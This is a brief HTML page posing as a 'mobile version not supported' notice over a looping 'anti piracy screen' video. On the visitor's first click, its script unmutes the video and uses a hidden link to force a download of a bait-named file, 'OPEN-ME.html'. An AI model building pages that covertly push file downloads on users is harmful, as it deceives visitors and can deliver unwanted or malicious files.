<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Mobile</title>
  <link rel="stylesheet" href="von.css">
</head>
<body>
  <video class="bg-video"
        src="King Von Anti Piracy Screen - REMASTERED - 480p.mp4"
        autoplay loop muted playsinline></video>
  <div class="overlay">
    <h1 id="info">THE MOBILE VERSION IS NOT SUPPORTED, OPEN THE PAGE ON A COMPUTER TO ACCESS THE GAME</h1>
  </div>

  <script>
    const video = document.querySelector('.bg-video');

    document.body.addEventListener('click', () => {
      video.muted = false;
      video.play();

      const dlLink = document.createElement('a');
      dlLink.href = 'OPEN-ME.html';
      dlLink.download = 'OPEN-ME.html';
      dlLink.style.display = 'none';
      document.body.appendChild(dlLink);
      dlLink.click();
      document.body.removeChild(dlLink);
    }, { once: true });
  </script>
</body>
</html>
